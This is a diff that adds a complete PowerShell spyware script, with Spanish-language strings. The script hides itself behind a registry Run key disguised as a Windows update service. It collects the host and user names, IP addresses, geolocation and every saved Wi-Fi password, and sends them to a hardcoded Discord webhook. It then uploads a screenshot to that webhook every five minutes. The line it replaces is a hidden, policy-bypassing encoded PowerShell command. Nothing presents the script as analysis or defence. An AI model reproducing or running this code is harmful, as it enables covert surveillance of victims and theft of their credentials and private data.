@@ -1,1 +1,101 @@
-powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwBhAGwAYQBtAGEAbgA0ADAAMAA4ADoAIABpAG4AdABlAGcAcgBhAGQAZQAgAHIAZQBjAG8AbgBuAGEAaQBzAHMAYQBuAGMAZQBgAG4AIAAgACMAPQAgACIAQwBvAG4AdABlAG4AdABvACAAZABlACAAaABhAGwAYQAgAGMAbABlAGEAcgAiAA==
+# ratman4080: integrated reconnaissance daemon with background loop
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$webhookUrl = "https://discord.com/api/webhooks/1545605485489561600/_colAGV1T31y49Q5hpakx8jAAHY5eNwqB3VtGzi0joSFB08omQOm-vMpMsvZykCfPgFp"
+
+# 1. Ensure Persistence in Registry Startup
+$scriptPath = $MyInvocation.MyCommand.Path
+if ($scriptPath) {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "WindowsUpdateServiceManager"
+    $runCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+    try {
+        Set-ItemProperty -Path $regPath -Name $regName -Value $runCommand -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+$user = $env:USERNAME
+$computer = $env:COMPUTERNAME
+
+# 2. Recon Execution Function (Runs on start)
+function Send-ReconReport {
+    $privateIp = "No disponible"
+    $gatewayIp = "No disponible"
+    try {
+        $privateIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
+        $gatewayIp = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NextHop) | Select-Object -First 1
+    } catch {}
+
+    $geoData = $null
+    try {
+        $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,country,city,isp,query,lat,lon" -UseBasicParsing
+    } catch {}
+
+    $publicIp = if ($geoData -and $geoData.status -eq "success") { $geoData.query } else { "No disponible" }
+    $country = if ($geoData -and $geoData.status -eq "success") { $geoData.country } else { "No disponible" }
+    $city = if ($geoData -and $geoData.status -eq "success") { $geoData.city } else { "No disponible" }
+    $isp = if ($geoData -and $geoData.status -eq "success") { $geoData.isp } else { "No disponible" }
+    $lat = if ($geoData -and $geoData.status -eq "success") { $geoData.lat } else { "" }
+    $lon = if ($geoData -and $geoData.status -eq "success") { $geoData.lon } else { "" }
+    $mapsLink = if ($lat -and $lon) { "https://www.google.com/maps/search/?api=1&query=$lat,$lon" } else { "No disponible" }
+
+    $wifiData = "No disponible"
+    try {
+        $wifiRaw = netsh wlan show profiles
+        $profiles = ($wifiRaw | Select-String "Perfil de todos los usuarios\s*:\s*(.*)").Matches.Groups[1].Value.Trim()
+        if (-not $profiles) { $profiles = ($wifiRaw | Select-String "All User Profile\s*:\s*(.*)").Matches.Groups[1].Value.Trim() }
+        
+        $wifiResults = foreach ($p in $profiles) {
+            $passRaw = netsh wlan show profile name="$p" key=clear
+            $pass = ($passRaw | Select-String "Contenido de la clave\s*:\s*(.*)").Matches.Groups[1].Value.Trim()
+            if (-not $pass) { $pass = ($passRaw | Select-String "Key Content\s*:\s*(.*)").Matches.Groups[1].Value.Trim() }
+            if (-not $pass) { $pass = "Sin contraseña" }
+            "$p -> $pass"
+        }
+        if ($wifiResults) { $wifiData = $wifiResults -join " | " }
+    } catch {
+        $wifiData = "Error al extraer Wi-Fi"
+    }
+
+    $report = "=== REPORTE DE RED Y UBICACIÓN ===" + "`n" +
+              "PC: $computer | Usuario: $user" + "`n" +
+              "IP Privada: $privateIp | Gateway: $gatewayIp" + "`n" +
+              "IP Pública: $publicIp ($country, $city) - ISP: $isp" + "`n" +
+              "Google Maps: $mapsLink" + "`n`n" +
+              "--- Wi-Fi y Claves ---`n$wifiData"
+
+    if ($report.Length -gt 1950) {
+        $report = $report.Substring(0, 1950) + "`n[... Recortado ...]"
+    }
+
+    $body = @{ content = $report } | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# Run the text reconnaissance report once on launch
+Send-ReconReport
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# 3. Infinite Background Loop (Screenshot every 5 minutes)
+while ($true) {
+    $screenshotPath = "$env:TEMP\snap_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+    try {
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+
+        if (Test-Path $screenshotPath) {
+            & curl.exe -s -F "file=@$screenshotPath" "$webhookUrl" > $null
+            Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
+        }
+    } catch {}
+
+    Start-Sleep -Seconds 300
+}
